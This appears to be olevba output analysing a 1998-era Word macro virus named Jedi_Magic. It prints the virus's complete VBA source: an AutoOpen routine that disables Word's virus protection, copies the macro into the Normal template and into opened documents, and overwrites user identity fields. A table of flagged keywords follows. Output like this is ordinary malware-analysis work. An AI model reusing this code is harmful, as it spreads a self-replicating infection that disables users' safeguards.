olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jedi_Magic
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Jedi_Magic - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jedi_Magic 
in file: Virus.MSWord.Jedi_Magic - OLE stream: 'Jedi_Magic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoOpen"
Options.VirusProtection = False
If Application.UserInitials <> "OBC" Then
    Application.OrganizerCopy Source:= _
    ActiveDocument.FullName, Destination:= _
    NormalTemplate.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Application.UserName = "O.B.1. Canobi"
    Application.UserInitials = "OBC"
    Application.UserAddress = "BOOGZI BARBERS ... Food Buster!!!"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Force" Then num = aVar.Index
Next aVar
If num = 0 Then
    Application.OrganizerCopy Source:= _
    NormalTemplate.FullName, Destination:= _
    ActiveDocument.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Variables.Add Name:="Force", Value:="567374-Joseph.A.D.G."
    ActiveDocument.Save
End If
End Sub
Sub AutoExit()
Attribute AutoExit.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoExit"
MsgBox "I love you" + Chr(10) + Chr(13) + "*.*"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

